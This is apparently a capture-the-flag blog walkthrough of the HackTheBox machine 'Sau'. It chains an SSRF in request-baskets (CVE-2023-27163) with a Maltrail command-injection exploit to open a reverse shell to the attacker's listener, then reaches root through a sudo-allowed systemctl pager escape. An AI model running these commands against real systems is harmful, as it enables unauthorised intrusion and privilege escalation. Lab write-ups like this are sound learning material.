---
layout: post
title: Sau - HackTheBox
categories:
- HackTheBox
tags:
- SSRF
- Linux
- CVE-2023-27163
- request-baskets
- Maltrail
- Command Injection
- systemctl
date: 2023-09-2
description: Sau is a machine that has a vulnerable version of the service request-baskets. The vulnerability presented is a Server Side Request Forgery that allows us to perform requests to internal services not exposed in the machine. The hidden service is a vulnerable version of Maltrail which gives us OS command injection giving access to the machine. In the end, to escalate privileges we used a misconfigured command in sudoers that uses systemctl status pager to get a shell as root.
summary: Sau is a machine that has a vulnerable version of the service request-baskets. The vulnerability presented is a Server Side Request Forgery that allows us to perform requests to internal services not exposed in the machine. The hidden service is a vulnerable version of Maltrail which gives us OS command injection giving access to the machine. In the end, to escalate privileges we used a misconfigured command in sudoers that uses systemctl status pager to get a shell as root.
cover:
  image: images/machine_img.png
---




## Recon

We found ports 22, 80 and 55555 running on the target machine using `nmap -sC -sV -oN nmap_scan IP`.
Port 55555 seems to be running a web application and port 80 can't be reached.

```

PORT      STATE    SERVICE VERSION                                                            
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                      
| ssh-hostkey:                                                                                
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)                                               
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)                                              
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)                                            
80/tcp    filtered http                                                                       
55555/tcp open     unknown                                                                    
| fingerprint-strings:                                                                        
|   FourOhFourRequest:                                                                        
|     HTTP/1.0 400 Bad Request                                                                
|     Content-Type: text/plain; charset=utf-8                                                 
|     X-Content-Type-Options: nosniff                                                         
|     Date: Thu, 28 Sep 2023 17:47:30 GMT                                                     
|     Content-Length: 75                                                                      
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$                 
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request                                                                
|     Content-Type: text/plain; charset=utf-8                                                 
|     Connection: close                                                                       
|     Request                                                                                 
|   GetRequest:                                                                               
|     HTTP/1.0 302 Found                                                                      
|     Content-Type: text/html; charset=utf-8                                                  
|     Location: /web                                                                          
|     Date: Thu, 28 Sep 2023 17:47:02 GMT                                                     
|     Content-Length: 27                                                                      
|     href="/web">Found</a>.                                                                  
|   HTTPOptions:                                                                              
|     HTTP/1.0 200 OK                                                                         
|     Allow: GET, OPTIONS                                                                     
|     Date: Thu, 28 Sep 2023 17:47:03 GMT                                                                                    
|_    Content-Length: 0  


```

It seems like a web application that allow us to inspect http requests called requests-basket and has a github repo: https://github.com/darklynx/request-baskets. It is in the version 1.2.1.

![](/images/sau/port_55555.png)

Looking for exploits for that service(request-baskets) and that version(1.2.1) we found the CVE-2023-27163:

- https://www.exploit-db.com/exploits/51675
- https://github.com/entr0pie/CVE-2023-27163
- https://nvd.nist.gov/vuln/detail/CVE-2023-27163

This vulnerability is a [Server Side Request Forger]y(https://portswigger.net/web-security/ssrf) which allow us to make requests to internal hosts not exposed, as if we were the vulnerable server.

We run the script present in the [repo](https://github.com/entr0pie/CVE-2023-27163):

```shell
./CVE-2023-27163.sh http://10.10.11.224:55555 http://localhost:80
```

![](/images/sau/ssrf.png)

This script will create a proxy basket as if it is the internal service. This means that, the generated basket, for example, http://10.10.11.224:55555/zwnush/ will be the same as accessing the machine port 80, http://localhost:80. Note: The CSV and javascript is not loaded because it tries to load from the basket and it does not have it.


## Foothold

The service that it seems running in the port 80 seems like the service Maltrail in the version (v0.53).
The searching for an exploit for that version in Google, the first link takes us to an [exploit](https://github.com/spookier/Maltrail-v0.53-Exploit) that gives us OS command injection.

We open a netcat listener `nc -lvnp 1234` and use the exploit `python3 exploit.py 10.10.14.199 1234 http://10.10.11.224:55555/zwnush/login` targeting the login page of maltrail. We get a shell as the user puma and looking in the passwd file we are the only normal user besides root. Home directory gives us the first flag.

![](/images/sau/login.png)


## Privilege Escalation

Here we want to try to upgrade to a more [interactive shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).
To do it, we first check for the presence of python in the machine with `which python3` then:
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
(CTRL + Z)
stty raw -echo 
(ENTER)
fg
(ENTER)
(ENTER)
export TERM=tmux-256color
```

To have a better coverage of what we can do in the machine as the user puma we send [linpeas](https://linpeas.sh/) to the target machine and execute it.
We found an unusual entry in sudoers file:

```shell
User puma may run the following commands on sau:                                                                                                                                              
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

This allow us to get the status of service running in the machine. However as explain in the [blog](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/) systemctl status uses a pager to show the output of the service. The pager allows to run commands if we type a exclamation mark: `!whoami`. In our case, since we are running the command already as root, `sudo /usr/bin/systemctl status trail.service`, we just do `!sh` and we get a shell inside pager as root and get the root flag.

